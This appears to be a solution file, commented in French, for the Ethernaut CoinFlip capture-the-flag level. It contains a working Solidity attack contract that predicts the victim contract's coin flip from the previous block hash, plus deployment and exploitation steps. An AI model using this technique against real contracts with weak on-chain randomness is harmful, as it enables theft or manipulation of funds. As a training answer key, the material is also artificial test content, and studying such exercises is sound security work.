// Level 3: CoinFlip - Solution
// L'objectif est de prédire correctement le résultat 10 fois consécutives

// Contrat d'attaque déployé via Remix
const attackContractCode = `
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ICoinFlip {
    function flip(bool _guess) external returns (bool);
}

contract CoinFlipAttack {
    ICoinFlip private victimContract;
    uint256 private constant FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    
    constructor(address _victimAddress) {
        victimContract = ICoinFlip(_victimAddress);
    }
    
    function attack() public returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        return victimContract.flip(side);
    }
}
`;

// Étapes d'exploitation documentées
/*
1. Déployer le contrat d'attaque sur Remix avec l'adresse de l'instance:
   - Adresse instance: await contract.address

2. Appeler attack() une fois par bloc jusqu'à 10 victoires:
   - Attendre ~15 secondes entre les appels
   - Vérifier les victoires: await contract.consecutiveWins()

3. Vérification finale:
   - 10 victoires consécutives requises
   - Soumettre l'instance à Ethernaut
*/

// Commandes de vérification
(async () => {
  console.log("Victoires actuelles:", (await contract.consecutiveWins()).toString());
})();